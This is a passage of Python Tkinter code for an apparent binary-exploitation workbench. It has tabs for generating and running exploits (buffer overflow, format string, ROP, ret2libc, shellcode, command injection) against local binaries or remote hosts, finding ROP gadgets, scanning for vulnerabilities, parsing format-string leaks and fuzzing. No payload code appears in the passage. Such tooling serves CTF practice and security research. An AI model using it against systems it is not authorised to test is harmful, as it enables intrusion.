        tk.Label(connection_frame, text="IP:", bg='#2c3e50', fg='white').pack(side=tk.LEFT, padx=(10, 5))
        self.interactive_remote_ip = tk.Entry(connection_frame, width=12)
        self.interactive_remote_ip.insert(0, "127.0.0.1")
        self.interactive_remote_ip.pack(side=tk.LEFT, padx=2)
        
        tk.Label(connection_frame, text="Port:", bg='#2c3e50', fg='white').pack(side=tk.LEFT, padx=5)
        self.interactive_remote_port = tk.Entry(connection_frame, width=6)
        self.interactive_remote_port.insert(0, "1337")
        self.interactive_remote_port.pack(side=tk.LEFT, padx=2)
        
        tk.Button(
            control_frame,
            text="Start/Reset Session",
            command=self.start_interactive_session,
            bg='#8e44ad',
            fg='white'
        ).pack(side=tk.LEFT, padx=5)
        
        tk.Label(control_frame, text="Input:", bg='#2c3e50', fg='white').pack(side=tk.LEFT, padx=5)
        
        self.input_entry = tk.Entry(control_frame, width=50, font=('Consolas', 10))
        self.input_entry.pack(side=tk.LEFT, padx=5)
        self.input_entry.bind('<Return>', lambda e: self.send_custom_input())
        
        tk.Button(
            control_frame,
            text="Send",
            command=self.send_custom_input,
            bg='#27ae60',
            fg='white'
        ).pack(side=tk.LEFT, padx=5)

        tk.Button(
            control_frame,
            text="Fuzz This Input",
            command=self.fuzz_custom_input,
            bg='#e74c3c',
            fg='white'
        ).pack(side=tk.LEFT, padx=5)
        
        self.interactive_text = scrolledtext.ScrolledText(
            frame,
            wrap=tk.WORD,
            font=('Consolas', 10),
            bg='#1e1e1e',
            fg='#d4d4d4'
        )
        self.interactive_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    
    def _create_exploit_tab(self, notebook):
        frame = tk.Frame(self.notebook)
        self.notebook.add(frame, text="💣 Exploit")
        
        # Top control bar
        control_frame = tk.Frame(frame)
        control_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(control_frame, text="Exploit Type:").pack(side=tk.LEFT, padx=5)
        self.exploit_type = tk.StringVar(value="buffer_overflow")
        
        exploit_types = [
            ("Buffer Overflow", "buffer_overflow"),
            ("Format String", "format_string"),
            ("ROP Chain", "rop"),
            ("Ret2Win", "ret2win"),
            ("Ret2Libc", "ret2libc"),
            ("Ret2PLT", "ret2plt"),
            ("SROP", "srop"),
            ("Shellcode Injection", "shellcode"),
            ("Ret2CSU", "ret2csu"),
            ("Command Injection", "command_injection")
        ]
        
        for text, value in exploit_types:
            tk.Radiobutton(
                control_frame,
                text=text,
                variable=self.exploit_type,
                value=value
            ).pack(side=tk.LEFT, padx=5)
        
        tk.Button(
            control_frame,
            text="Generate Exploit",
            command=self.generate_exploit,
            bg='#e67e22',
            fg='white'
        ).pack(side=tk.LEFT, padx=10)

        tk.Button(
            control_frame,
            text="Save Exploit",
            command=lambda: self.export_text(self.exploit_editor),
            bg='#2ecc71',
            fg='white'
        ).pack(side=tk.LEFT, padx=10)

        tk.Button(
            control_frame,
            text="📋 Copy",
            command=lambda: self.copy_to_clipboard(self.exploit_editor),
            bg='#34495e',
            fg='white'
        ).pack(side=tk.LEFT, padx=10)
        
        # Split pane: Editor on top, Runner on bottom
        paned = tk.PanedWindow(frame, orient=tk.VERTICAL)
        paned.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # --- EXPLOIT EDITOR ---
        editor_frame = tk.Frame(paned)
        paned.add(editor_frame, height=350)
        
        tk.Label(editor_frame, text="Exploit Script", font=('Arial', 10, 'bold')).pack(anchor='w', padx=5)
        
        self.exploit_editor = scrolledtext.ScrolledText(
            editor_frame,
            wrap=tk.WORD,
            font=('Consolas', 10),
            bg='#1e1e1e',
            fg='#d4d4d4',
            insertbackground='white'
        )
        self.exploit_editor.pack(fill=tk.BOTH, expand=True)
        
        # --- EXPLOIT RUNNER ---
        runner_frame = tk.Frame(paned, bg='#34495e')
        paned.add(runner_frame, height=250)
        
        tk.Label(runner_frame, text="Exploit Runner", font=('Arial', 10, 'bold'), bg='#34495e', fg='white').pack(anchor='w', padx=5, pady=5)
        
        # Runner config
        config_frame = tk.Frame(runner_frame, bg='#34495e')
        config_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.exploit_target_type = tk.StringVar(value="local")
        tk.Radiobutton(config_frame, text="Local Binary", variable=self.exploit_target_type, value="local", bg='#34495e', fg='white', selectcolor='#2c3e50').pack(side=tk.LEFT, padx=5)
        tk.Radiobutton(config_frame, text="Remote Server", variable=self.exploit_target_type, value="remote", bg='#34495e', fg='white', selectcolor='#2c3e50').pack(side=tk.LEFT, padx=5)
        
        tk.Label(config_frame, text="IP:", bg='#34495e', fg='white').pack(side=tk.LEFT, padx=(20, 5))
        self.exploit_remote_ip = tk.Entry(config_frame, width=15)
        self.exploit_remote_ip.insert(0, "127.0.0.1")
        self.exploit_remote_ip.pack(side=tk.LEFT, padx=5)
        
        tk.Label(config_frame, text="Port:", bg='#34495e', fg='white').pack(side=tk.LEFT, padx=5)
        self.exploit_remote_port = tk.Entry(config_frame, width=8)
        self.exploit_remote_port.insert(0, "1337")
        self.exploit_remote_port.pack(side=tk.LEFT, padx=5)
        
        tk.Label(config_frame, text="Args:", bg='#34495e', fg='white').pack(side=tk.LEFT, padx=(20, 5))
        self.exploit_args = tk.Entry(config_frame, width=20)
        self.exploit_args.pack(side=tk.LEFT, padx=5)
        
        # Second config row for post-exploit commands
        config_frame2 = tk.Frame(runner_frame, bg='#34495e')
        config_frame2.pack(fill=tk.X, padx=5, pady=5)
        
        tk.Label(config_frame2, text="Post-Exploit Cmds:", bg='#34495e', fg='white').pack(side=tk.LEFT, padx=5)
        self.post_exploit_cmds = tk.Entry(config_frame2, width=40)
        self.post_exploit_cmds.insert(0, "id")  # Default command
        self.post_exploit_cmds.pack(side=tk.LEFT, padx=5)
        
        self.exploit_debug_mode = tk.BooleanVar(value=False)
        tk.Checkbutton(config_frame2, text="Debug (GDB)", variable=self.exploit_debug_mode, bg='#34495e', fg='white', selectcolor='#2c3e50').pack(side=tk.LEFT, padx=10)
        
        # Runner controls
        controls_frame = tk.Frame(runner_frame, bg='#34495e')
        controls_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.run_exploit_btn = tk.Button(controls_frame, text="▶ Run Exploit", command=self.run_exploit, bg='#27ae60', fg='white', width=15)
        self.run_exploit_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_exploit_btn = tk.Button(controls_frame, text="⏹ Stop", command=self.stop_exploit, bg='#e74c3c', fg='white', width=10, state='disabled')
        self.stop_exploit_btn.pack(side=tk.LEFT, padx=5)
        
        tk.Button(controls_frame, text="🗑️ Clear Output", command=self.clear_exploit_output, bg='#95a5a6', fg='white', width=12).pack(side=tk.LEFT, padx=5)
        
        self.exploit_status_label = tk.Label(controls_frame, text="Ready", bg='#34495e', fg='#ecf0f1', font=('Arial', 9, 'italic'))
        self.exploit_status_label.pack(side=tk.LEFT, padx=20)
        
        # Output console
        tk.Label(runner_frame, text="Output Console", font=('Arial', 9, 'bold'), bg='#34495e', fg='white').pack(anchor='w', padx=5)
        
        self.exploit_output = scrolledtext.ScrolledText(
            runner_frame,
            wrap=tk.WORD,
            font=('Consolas', 9),
            bg='#0d1117',
            fg='#58a6ff',
            height=10
        )
        self.exploit_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.exploit_output.config(state='disabled')
        
        # Initialize runner state
        self.exploit_process = None
        self.exploit_running = False
    
    def _create_gadgets_tab(self):
        frame = tk.Frame(self.notebook)
        self.notebook.add(frame, text="🔧 ROP Gadgets")
        
        control_frame = tk.Frame(frame)
        control_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(control_frame, text="Max Results:").pack(side=tk.LEFT, padx=5)
        self.gadget_max_results = tk.IntVar(value=100)
        tk.Spinbox(
            control_frame,
            from_=10,
            to=500,
            increment=10,
            textvariable=self.gadget_max_results,
            width=10
        ).pack(side=tk.LEFT, padx=5)
        
        tk.Button(
            control_frame,
            text="Find ROP Gadgets",
            command=self._find_gadgets,
            bg='#e67e22',
            fg='white'
        ).pack(side=tk.LEFT, padx=10)
        
        tk.Button(
            control_frame,
            text="Export Gadgets",
            command=lambda: self.export_text(self.gadget_text),
            bg='#2ecc71',
            fg='white'
        ).pack(side=tk.LEFT, padx=10)
        
        paned = tk.PanedWindow(frame, orient=tk.HORIZONTAL)
        paned.pack(fill=tk.BOTH, expand=True)
        
        left_frame = tk.Frame(paned)
        paned.add(left_frame, width=300)
        
        tk.Label(
            left_frame,
            text="Discovered ROP Gadgets",
            font=('Arial', 12, 'bold')
        ).pack(anchor='w', padx=10, pady=10)
        
        self.gadget_listbox = tk.Listbox(
            left_frame,
            font=('Consolas', 9),
            selectmode=tk.SINGLE
        )
        self.gadget_listbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.gadget_listbox.bind('<<ListboxSelect>>', self.on_gadget_select)
        
        right_frame = tk.Frame(paned)
        paned.add(right_frame)
        
        tk.Label(
            right_frame,
            text="Gadget Details",
            font=('Arial', 12, 'bold')
        ).pack(anchor='w', padx=10, pady=10)
        
        self.gadget_text = scrolledtext.ScrolledText(
            right_frame,
            wrap=tk.WORD,
            font=('Consolas', 10),
            bg='#1e1e1e',
            fg='#d4d4d4'
        )
        self.gadget_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.gadget_text.config(state='disabled')

    def _create_code_editor_tab(self):
        frame = tk.Frame(self.notebook)
        self.notebook.add(frame, text="📝 Code Editor")
        
        toolbar = tk.Frame(frame)
        toolbar.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Button(toolbar, text="📂 Open", command=self.load_file_to_editor, bg='#3498db', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(toolbar, text="💾 Save", command=self.save_editor_file, bg='#2ecc71', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(toolbar, text="💾 Save As...", command=self.save_as_editor_file, bg='#27ae60', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(toolbar, text="📋 Copy", command=lambda: self.copy_to_clipboard(self.code_editor), bg='#34495e', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(toolbar, text="🗑️ Clear", command=self.clear_editor, bg='#e74c3c', fg='white').pack(side=tk.LEFT, padx=5)
        
        self.current_file_label = tk.Label(toolbar, text="No file opened", font=('Arial', 9, 'italic'), fg='gray')
        self.current_file_label.pack(side=tk.LEFT, padx=20)

        self.code_editor = scrolledtext.ScrolledText(
            frame,
            wrap=tk.NONE,
            font=('Consolas', 11),
            bg='#1e1e1e',
            fg='#d4d4d4',
            insertbackground='white',  # Cursor color
            selectbackground='#264f78',  # Selection background
            undo=True
        )
        self.code_editor.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    def load_file_to_editor(self):
        filepath = filedialog.askopenfilename(
            filetypes=[("Python Files", "*.py"), ("Text Files", "*.txt"), ("All Files", "*.*")]
        )
        if not filepath:
            return
            
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                content = f.read()
            
            self.code_editor.delete(1.0, tk.END)
            self.code_editor.insert(tk.END, content)
            self.editor_file_path = filepath
            self.current_file_label.config(text=filepath)
            
            # Switch to editor tab
            for i in range(self.notebook.index('end')):
                 if self.notebook.tab(i, "text") == "📝 Code Editor":
                     self.notebook.select(i)
                     break
            
            self.log(f"Opened file: {filepath}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to open file: {str(e)}")

    def save_editor_file(self):
        if not self.editor_file_path:
            self.save_as_editor_file()
            return
            
        try:
            content = self.code_editor.get(1.0, tk.END)
            with open(self.editor_file_path, 'w', encoding='utf-8') as f:
                f.write(content)
            self.log(f"Saved file: {self.editor_file_path}")
            messagebox.showinfo("Success", "File saved successfully!")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save file: {str(e)}")

    def save_as_editor_file(self):
        filepath = filedialog.asksaveasfilename(
            defaultextension=".py",
            filetypes=[("Python Files", "*.py"), ("Text Files", "*.txt"), ("All Files", "*.*")]
        )
        if not filepath:
            return
            
        self.editor_file_path = filepath
        self.current_file_label.config(text=filepath)
        self.save_editor_file()

    def clear_editor(self):
        if self.code_editor.get(1.0, tk.END).strip():
            if not messagebox.askyesno("Confirm", "Clear editor contents? Unsaved changes will be lost."):
                return
        self.code_editor.delete(1.0, tk.END)
        self.editor_file_path = None
        self.current_file_label.config(text="No file opened")

    def open_in_editor_from_exploit(self):
        content = self.exploit_editor.get(1.0, tk.END)
        if not content.strip():
            messagebox.showinfo("Info", "No exploit code to edit.")
            return
            
        self.code_editor.delete(1.0, tk.END)
        self.code_editor.insert(tk.END, content)
        self.editor_file_path = None
        self.current_file_label.config(text="New Exploit (Unsaved)")
        
        for i in range(self.notebook.index('end')):
             if self.notebook.tab(i, "text") == "📝 Code Editor":
                 self.notebook.select(i)
                 break
    
    def _find_gadgets(self):
        if not self.binary_path:
            messagebox.showwarning("Warning", "Please load a binary file first!")
            return
        
        def find_gadgets_thread():
            self.is_running = True
            self.update_status("Finding ROP gadgets...", True)
            
            try:
                gadget_finder = ROPGadgetFinder(self.binary_path)
                max_results = self.gadget_max_results.get()
                gadgets = gadget_finder.find_gadgets(max_results=max_results)
                
                self.current_gadgets = gadgets
                self.root.after(0, self.display_gadgets, gadgets)
                self.root.after(0, self.log, f"Found {len(gadgets)} ROP gadgets")
                
            except Exception as e:
                self.root.after(0, self.log, f"Gadget finding failed: {str(e)}")
                self.root.after(0, traceback.print_exc)
            
            finally:
                self.root.after(0, lambda: self.update_status("Ready", False))
                self.is_running = False
        
        if not self.is_running:
            threading.Thread(target=find_gadgets_thread, daemon=True).start()
    
    def display_gadgets(self, gadgets):
        self.gadget_listbox.delete(0, tk.END)
        
        for gadget in gadgets:
            addr = gadget.get('address', '0x0')
            instr = gadget.get('instructions', 'unknown')
            # Display full instruction without truncation
            display = f"{addr:>8}  {instr}"
            self.gadget_listbox.insert(tk.END, display)
        
        self.gadget_text.config(state='normal')
        self.gadget_text.delete(1.0, tk.END)
        
        text = "=" * 60 + "\n"
        text += "                   ROP Gadgets Report\n"
        text += "=" * 60 + "\n\n"
        text += f"📊 Total Gadgets Found: {len(gadgets)}\n\n"
        text += "Gadget List:\n"
        text += "-" * 60 + "\n"
        
        for i, gadget in enumerate(gadgets[:20], 1):
            text += f"\n{i}. Address: {gadget.get('address', '0x0')}\n"
            text += f"   Instructions: {gadget.get('instructions', 'unknown')}\n"
            text += f"   Source: {gadget.get('source', 'unknown')}\n"
        
        if len(gadgets) > 20:
            text += f"\n... and {len(gadgets) - 20} more gadgets\n"
        
        text += "\n" + "=" * 60 + "\n"
        text += "💡 Usage Tips:\n"
        text += "-" * 60 + "\n"
        text += "• Use these gadgets to build ROP chains\n"
        text += "• Each gadget shows the instruction sequence\n"
        text += "• Addresses can be used for relative jumps\n"
        text += "• Combine gadgets to bypass security protections\n"
        
        self.gadget_text.insert(tk.END, text)
        self.gadget_text.config(state='disabled')
    
    def on_gadget_select(self, event):
        selection = self.gadget_listbox.curselection()
        if not selection:
            return
        
        index = selection[0]
        if index < len(self.current_gadgets):
            gadget = self.current_gadgets[index]
            
            self.gadget_text.config(state='normal')
            self.gadget_text.delete(1.0, tk.END)
            
            text = "=" * 60 + "\n"
            text += "                   Gadget Details\n"
            text += "=" * 60 + "\n\n"
            text += f"📍 Address: {gadget.get('address', 'Unknown')}\n"
            text += f"📜 Instructions: {gadget.get('instructions', 'Unknown')}\n"
            text += f"🔍 Source: {gadget.get('source', 'Unknown')}\n"
            text += f"🏗️ Architecture: {gadget.get('arch', 'Unknown')}\n"
            text += f"🔗 Offset: {gadget.get('offset', 'Unknown')}\n\n"
            
            text += "Assembly Breakdown:\n"
            text += "-" * 60 + "\n"
            instructions = gadget.get('instructions', '').split(';')
            for instr in instructions:
                text += f"  {instr.strip()}\n"
            
            self.gadget_text.insert(tk.END, text)
            self.gadget_text.config(state='disabled')
    
    def _create_log_tab(self):
        frame = tk.Frame(self.notebook)
        self.notebook.add(frame, text="📋 Log")
        
        toolbar = tk.Frame(frame)
        toolbar.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Button(
            toolbar,
            text="Clear Log",
            command=self.clear_log,
            bg='#95a5a6',
            fg='white'
        ).pack(side=tk.LEFT, padx=5)
        
        tk.Button(
            toolbar,
            text="Export Log",
            command=lambda: self.export_text(self.log_text),
            bg='#2ecc71',
            fg='white'
        ).pack(side=tk.LEFT, padx=5)
        
        self.log_text = scrolledtext.ScrolledText(
            frame,
            wrap=tk.WORD,
            font=('Consolas', 10),
            bg='#1e1e1e',
            fg='#d4d4d4'
        )
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.log_text.config(state='disabled')
    
    def _create_status_bar(self):
        status_bar = tk.Frame(self.root, height=25, bg='#2c3e50')
        status_bar.pack(fill=tk.X, side=tk.BOTTOM)
        status_bar.pack_propagate(False)
        
        self.status_message = tk.Label(
            status_bar,
            text="Ready",
            bg='#2c3e50',
            fg='white',
            font=('Arial', 9)
        )
        self.status_message.pack(side=tk.LEFT, padx=10)
        
        self.progress = ttk.Progressbar(
            status_bar,
            mode='indeterminate',
            length=200
        )
        self.progress.pack(side=tk.RIGHT, padx=10, pady=2)
    
    def _center_window(self):
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
    
    def log(self, message):
        def update_log():
            self.log_text.config(state='normal')
            self.log_text.insert(tk.END, message + "\n")
            self.log_text.see(tk.END)
            self.log_text.config(state='disabled')
        
        if threading.current_thread() is threading.main_thread():
            update_log()
        else:
            self.root.after(0, update_log)
    
    def update_status(self, message, is_working=False):
        def update():
            self.status_message.config(text=message)
            if is_working:
                self.progress.start()
            else:
                self.progress.stop()
        
        if threading.current_thread() is threading.main_thread():
            update()
        else:
            self.root.after(0, update)
    
    def clear_log(self):
        self.log_text.config(state='normal')
        self.log_text.delete(1.0, tk.END)
        self.log_text.config(state='disabled')
    
    def load_binary(self):
        filename = filedialog.askopenfilename(
            title="Select Binary File",
            filetypes=[
                ("Executable files", "*.elf *.exe *.bin *.out"),
                ("All files", "*.*")
            ]
        )
        
        if filename:
            self.binary_path = filename
            self.runner = BinaryRunner(self.binary_path) # Fix: Initialize runner when binary is loaded
            self.binary_label.config(text=os.path.basename(filename))
            self.log(f"Loaded binary file: {filename}")
            self.update_status(f"Loaded: {os.path.basename(filename)}")

    def copy_to_clipboard(self, widget):
        try:
            text = widget.get(1.0, tk.END)
            self.root.clipboard_clear()
            self.root.clipboard_append(text)
            self.log("Copied to clipboard")
            messagebox.showinfo("Info", "Copied to clipboard!")
        except Exception as e:
            self.log(f"Clipboard error: {e}")
    
    def analyze_binary(self):
        if not self.binary_path:
            messagebox.showwarning("Warning", "Please load a binary file first!")
            return
        
        def analyze_thread():
            self.is_running = True
            self.update_status("Analyzing binary file...", True)
            
            try:
                self.analyzer = BinaryAnalyzer(self.binary_path)
                results = self.analyzer.analyze()
                
                self.root.after(0, self.display_analysis, results)
                self.root.after(0, self.log, "Binary analysis completed!")
                
            except Exception as e:
                self.root.after(0, self.log, f"Analysis failed: {str(e)}")
                self.root.after(0, traceback.print_exc)
            
            finally:
                self.root.after(0, lambda: self.update_status("Ready", False))
                self.is_running = False
        
        if not self.is_running:
            threading.Thread(target=analyze_thread, daemon=True).start()
    
    def display_analysis(self, results):
        self.analysis_text.config(state='normal')
        self.analysis_text.delete(1.0, tk.END)
        
        text = "=" * 60 + "\n"
        text += "                   Binary Analysis Report\n"
        text += "=" * 60 + "\n\n"
        
        text += "📁 Basic Information\n"
        text += "-" * 40 + "\n"
        if 'basic_info' in results:
            text += f"{results['basic_info'].get('file_info', 'Unknown')}\n"
        
        if 'architecture' in results:
            arch = results['architecture']
            text += f"\n🏗️ Architecture: {arch.get('arch', 'Unknown')} ({arch.get('bits', 0)}-bit)\n"
            text += f"Endianness: {arch.get('endian', 'Unknown')}\n"
        
        if 'protections' in results:
            text += "\n🛡️ Security Protections\n"
            text += "-" * 40 + "\n"
            for prot, value in results['protections'].items():
                icon = "✅" if value == 'YES' else "❌" if value == 'NO' else "❓"
                text += f"{prot}: {value} {icon}\n"
        
        if 'sections' in results:
            text += "\n📊 Section Information\n"
            text += "-" * 40 + "\n"
            for sec in results['sections'][:10]:
                text += f"{sec['name']:20} {sec['address']:>10} {sec['size']:>10}\n"
        
        if 'symbols' in results:
            symbols = results['symbols']
            if symbols.get('functions'):
                text += "\n🔧 Function Information\n"
                text += "-" * 40 + "\n"
                for func in symbols['functions'][:15]:
                    text += f"{func['address']:>10} {func['name']}\n"
        
        self.analysis_text.insert(tk.END, text)
        self.analysis_text.config(state='disabled')
    
    def scan_vulnerabilities(self):
        if not self.binary_path:
            messagebox.showwarning("Warning", "Please load a binary file first!")
            return
        
        def scan_thread():
            self.is_running = True
            self.update_status("Scanning for vulnerabilities...", True)
            
            try:
                self.scanner = VulnerabilityScanner(self.binary_path)
                results = self.scanner.scan(depth=2)
                
                self.current_results = results
                
                self.root.after(0, self.display_vulnerabilities, results)
                self.root.after(0, self.log, "Vulnerability scan completed!")
                
            except Exception as e:
                self.root.after(0, self.log, f"Scan failed: {str(e)}")
            
            finally:
                self.root.after(0, lambda: self.update_status("Ready", False))
                self.is_running = False
        
        if not self.is_running:
            threading.Thread(target=scan_thread, daemon=True).start()
    
    def display_vulnerabilities(self, results):
        self.vuln_listbox.delete(0, tk.END)
        
        details = results.get('details', {})
        
        for vuln_type, vulns in details.items():
            if vulns:
                self.vuln_listbox.insert(tk.END, f"--- {vuln_type.upper()} ---")
                for vuln in vulns[:10]:
                    desc = vuln.get('description', 'Unknown vulnerability')
                    severity = vuln.get('severity', 'Unknown')
                    self.vuln_listbox.insert(tk.END, f"  [{severity}] {desc[:50]}")
        
        self.vuln_details.config(state='normal')
        self.vuln_details.delete(1.0, tk.END)
        
        text = "=" * 60 + "\n"
        text += "                   Vulnerability Scan Report\n"
        text += "=" * 60 + "\n\n"
        
        text += f"📈 Total Vulnerabilities: {results.get('total_vulnerabilities', 0)}\n\n"
        
        text += "Statistics by Type:\n"
        text += "-" * 40 + "\n"
        for vuln_type, count in results.get('by_type', {}).items():
            text += f"{vuln_type}: {count}\n"
        
        text += "\nStatistics by Severity:\n"
        text += "-" * 40 + "\n"
        for severity, count in results.get('by_severity', {}).items():
            text += f"{severity}: {count}\n"
        
        self.vuln_details.insert(tk.END, text)
        self.vuln_details.config(state='disabled')
    
    def on_vuln_select(self, event):
        selection = self.vuln_listbox.curselection()
        if not selection:
            return
        
        index = selection[0]
        selected = self.vuln_listbox.get(index)
        
        self.vuln_details.config(state='normal')
        self.vuln_details.delete(1.0, tk.END)
        
        found = False
        if self.current_results and 'vulnerabilities' in self.current_results:
            for vuln in self.current_results['vulnerabilities']:
                # Simple matching strategy
                if vuln['type'] in selected:
                    found = True
                    self.vuln_details.insert(tk.END, f"Name: {vuln['type']}\n")
                    self.vuln_details.insert(tk.END, f"Severity: {vuln['severity']}\n")
                    self.vuln_details.insert(tk.END, f"Description: {vuln['description']}\n")
                    self.vuln_details.insert(tk.END, f"-" * 30 + "\n")
                    if 'cwe' in vuln:
                         self.vuln_details.insert(tk.END, f"CWE: {vuln['cwe']}\n")
                    break
        
        if not found:
             self.vuln_details.insert(tk.END, f"Details for: {selected}\n(No further details available)")
             
        self.vuln_details.config(state='disabled')
    
    def interactive_analysis(self):
        if not self.binary_path:
            messagebox.showwarning("Warning", "Please load a binary file first!")
            return
        
        self.interactive_text.delete(1.0, tk.END)
        self.interactive_text.insert(tk.END, "Interactive Analysis Mode (Persistent Session)\n")
        self.interactive_text.insert(tk.END, "Click 'Start/Reset Session' to begin.\n")
        self.interactive_text.insert(tk.END, "=" * 50 + "\n\n")
        
        self.log("Switched to interactive analysis")
    
    def start_interactive_session(self):
        # Check if remote mode
        if self.interactive_mode.get() == "remote":
            ip = self.interactive_remote_ip.get()
            port = self.interactive_remote_port.get()
            
            if not ip or not port:
                messagebox.showwarning("Warning", "Please enter IP and Port for remote connection!")
                return
            
            try:
                port = int(port)
            except:
                messagebox.showerror("Error", "Port must be a number!")
                return
            
            if hasattr(self, 'interactive_session') and self.interactive_session:
                self.interactive_session.stop()
            
            self.interactive_session = InteractiveSession(remote_ip=ip, remote_port=port)
            if self.interactive_session.start():
                self.interactive_text.delete(1.0, tk.END)
                self.interactive_text.insert(tk.END, f"[*] Connected to {ip}:{port}\n")
                self.update_status(f"Remote session active ({ip}:{port})", True)
                self._update_interactive_output()
            else:
                self.log("Failed to connect to remote server")
                messagebox.showerror("Error", f"Failed to connect to {ip}:{port}")
        else:
            # Local mode
            if not self.binary_path:
                messagebox.showwarning("Warning", "Please load a binary file first!")
                return
            
            if hasattr(self, 'interactive_session') and self.interactive_session:
                self.interactive_session.stop()
                
            self.interactive_session = InteractiveSession(self.binary_path)
            if self.interactive_session.start():
                self.interactive_text.delete(1.0, tk.END)
                self.interactive_text.insert(tk.END, f"[*] Started session for {os.path.basename(self.binary_path)}\n")
                self.update_status("Interactive session active", True)
                
                # Start UI updater
                self._update_interactive_output()
            else:
                self.log("Failed to start interactive session")
                messagebox.showerror("Error", "Failed to start binary process")

    def _update_interactive_output(self):
        if hasattr(self, 'interactive_session') and self.interactive_session and self.interactive_session.running:
            try:
                output = self.interactive_session.get_output()
                if output:
                    self.interactive_text.insert(tk.END, output)
                    self.interactive_text.see(tk.END)
            except Exception as e:
                pass
            
            # Keep the updater running
            self.root.after(100, self._update_interactive_output)
        elif hasattr(self, 'interactive_session') and self.interactive_session:
            # Process stopped but session exists
            self.update_status("Interactive session stopped", False)
            self.interactive_text.insert(tk.END, "\n[*] Process terminated.\n")

    def send_custom_input(self):
        user_input = self.input_entry.get()
        if not user_input:
            return
            
        if not hasattr(self, 'interactive_session') or not self.interactive_session or not self.interactive_session.running:
            messagebox.showwarning("Warning", "Session not running. Click Start/Reset Session.")
            return

        self.interactive_text.insert(tk.END, f"{user_input}\n")
        
        # Check if this is a format string payload
        is_format_string = '%' in user_input and any(x in user_input for x in ['p', 's', 'x', 'n'])
        
        if self.interactive_session.send(user_input):
            self.input_entry.delete(0, tk.END)
            
            # If format string, wait a bit and parse the output
            if is_format_string:
                self.root.after(200, self._parse_format_string_output)
        else:
            self.log("Failed to send input")

    def _parse_format_string_output(self):
        """Parse the last output for format string leaks and display them formatted"""
        try:
            # Get recent output from interactive text widget
            last_output = self.interactive_text.get("end-10l", "end").strip()
            
            # Extract leaked addresses (0x... patterns)
            import re
            leak_pattern = r'(0x[0-9a-fA-F]{8,16})'
            leaks = re.findall(leak_pattern, last_output)
            
            if leaks:
                # Display formatted leak table
                self.interactive_text.insert(tk.END, "\n" + "="*60 + "\n")
                self.interactive_text.insert(tk.END, "🔍 FORMAT STRING LEAK DETECTED\n")
                self.interactive_text.insert(tk.END, "="*60 + "\n")
                self.interactive_text.insert(tk.END, f"{'Address':<20} {'Type':<15} {'Notes'}\n")
                self.interactive_text.insert(tk.END, "-"*60 + "\n")
                
                for leak in leaks[:10]:  # Show first 10 leaks
                    leak_type = self._identify_leak_type(leak)
                    notes = self._get_leak_notes(leak, leak_type)
                    self.interactive_text.insert(tk.END, f"{leak:<20} {leak_type:<15} {notes}\n")
                
                self.interactive_text.insert(tk.END, "="*60 + "\n\n")
                self.interactive_text.see(tk.END)
                
                # Log summary
                self.log(f"Detected {len(leaks)} leaked address(es)")
        except Exception as e:
            pass  # Silently fail if parsing doesn't work

    def _identify_leak_type(self, address):
        """Identify the type of leaked address"""
        try:
            addr_int = int(address, 16)
            
            # Stack addresses (typically 0x7f... or 0x7fff...)
            if 0x7f0000000000 <= addr_int <= 0x7fffffffffff:
                return "Stack/Libc"
            # PIE/Heap addresses (typically 0x55... or 0x56...)
            elif 0x550000000000 <= addr_int <= 0x56ffffffffff:
                return "PIE/Heap"
            # Low addresses - might be .text or .data
            elif addr_int < 0x1000000:
                return "Code/.data"
            else:
                return "Unknown"
        except:
            return "Unknown"

    def _get_leak_notes(self, address, leak_type):
        """Get notes about the leaked address"""
        if "Stack" in leak_type:
            return "Potential libc/stack leak"
        elif "PIE" in leak_type:
            return "Potential binary base leak"
        elif "Code" in leak_type:
            return "Potential code segment"
        return ""

    def fuzz_custom_input(self):
        """Fuzz the current state by replaying history + payload"""
        if not hasattr(self, 'interactive_session') or not self.interactive_session:
             messagebox.showwarning("Warning", "No active session history to fuzz.")
             return

        history = list(self.interactive_session.history) # Copy history
        self.log(f"Fuzzing based on {len(history)} interaction steps...")
        
        # Ask user for fuzzing type
        fuzz_type_dialog = tk.Toplevel(self.root)
        fuzz_type_dialog.title("Select Fuzzing Type")
        fuzz_type_dialog.geometry("300x150")
        
        tk.Label(fuzz_type_dialog, text="Choose fuzzing strategy:", pady=10).pack()
        
        def run_format_fuzz():
            fuzz_type_dialog.destroy()
            threading.Thread(target=self._fuzz_format_string, args=(history,), daemon=True).start()
            
        def run_bof_fuzz():
            fuzz_type_dialog.destroy()
            threading.Thread(target=self._fuzz_buffer_overflow, args=(history,), daemon=True).start()

        tk.Button(fuzz_type_dialog, text="Format String (Leaks)", command=run_format_fuzz, width=25, bg='#3498db', fg='white').pack(pady=5)
        tk.Button(fuzz_type_dialog, text="Buffer Overflow (Cyclic)", command=run_bof_fuzz, width=25, bg='#e74c3c', fg='white').pack(pady=5)

    def _fuzz_format_string(self, history):
        """Smart format string fuzzing using pwntools for multi-prompt handling"""
        self.update_status("Fuzzing Format String...", True)
        self.log("Starting Format String Fuzzing (Offsets 1-55)...")
        self.interactive_text.insert(tk.END, "\n" + "="*70 + "\n")
        self.interactive_text.insert(tk.END, "🎯 AUTOMATED FORMAT STRING FUZZING\n")
